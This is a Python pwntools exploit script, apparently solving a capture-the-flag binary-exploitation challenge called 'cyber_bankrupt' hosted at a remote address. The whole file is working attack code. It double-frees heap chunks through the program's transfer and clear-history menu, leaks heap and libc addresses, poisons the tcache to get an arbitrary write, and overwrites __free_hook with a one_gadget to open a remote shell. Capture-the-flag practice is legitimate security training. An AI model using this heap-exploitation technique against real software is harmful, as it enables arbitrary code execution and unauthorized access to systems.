#!/usr/bin/env python3
from pwn import *
import os

# -------- Configuration --------
BINARY = './cyber_bankrupt'
LIBC   = './glibc/libc.so.6'
HOST, PORT = '94.237.57.57', 42024

elf  = ELF(BINARY)
libc = ELF(LIBC)

def start():
    if args.LOCAL:
        return process([BINARY], env={'LD_LIBRARY_PATH': os.path.dirname(LIBC)})
    return remote(HOST, PORT)

def choose(r, opt):
    r.sendlineafter(b'> ', str(opt).encode())

# Fully sync transfer_money():
#   1) Enter Bank ID
#   2) Enter amount
#   3) Enter receiver
#   4) Wait for success
def transfer(r, size, data):
    choose(r, 1)
    r.sendlineafter(b'Enter Bank ID:', b'0')
    r.sendlineafter(b'Enter amount you want to transfer:', str(size).encode())
    r.sendlineafter(b'Enter receiver:', data)
    r.recvuntil(b'Transaction succeed!\n\n')

def clear_history(r):
    choose(r, 2)
    r.sendlineafter(b'Enter Bank ID:', b'0')
    r.recvuntil(b'Transaction history has been wiped out!\n\n')

def view_details(r):
    choose(r, 3)
    r.sendlineafter(b'Enter Bank ID:', b'0')
    return r.recvline().strip()

def exploit():
    r = start()

    # 0) PIN
    r.sendlineafter(b'Enter 4-digit pin:', b'6969')

    # 1) Double‑free the 0x100 chunk
    transfer(r, 0x100, b'A'*8)
    clear_history(r)
    clear_history(r)

    # 2) Leak heap pointer
    leak = view_details(r)
    heap_leak = u64(leak.ljust(8, b'\x00'))
    log.info(f'Heap @ {hex(heap_leak)}')

    # 3) Tcache‑poison for arbitrary write
    transfer(r, 0x100, p64(heap_leak))
    transfer(r, 0x420, b'B'*8)
    transfer(r, 0x100, p64(heap_leak))
    transfer(r, 0x100, b'C'*8)
    clear_history(r)

    # 4) Leak libc base
    leak2 = view_details(r)
    libc_leak = u64(leak2.ljust(8, b'\x00'))
    libc.address = libc_leak - 0x3ebca0
    log.info(f'libc base @ {hex(libc.address)}')

    # 5) Overwrite __free_hook with one_gadget
    one_gadget = libc.address + 0x4f322
    transfer(r, 0x40, p64(libc.sym['__free_hook']))
    transfer(r, 0x100, b'D'*8)
    transfer(r, 0x100, p64(one_gadget))

    # 6) Trigger free(0) → one_gadget → shell
    clear_history(r)
    r.interactive()

if __name__ == '__main__':
    exploit()
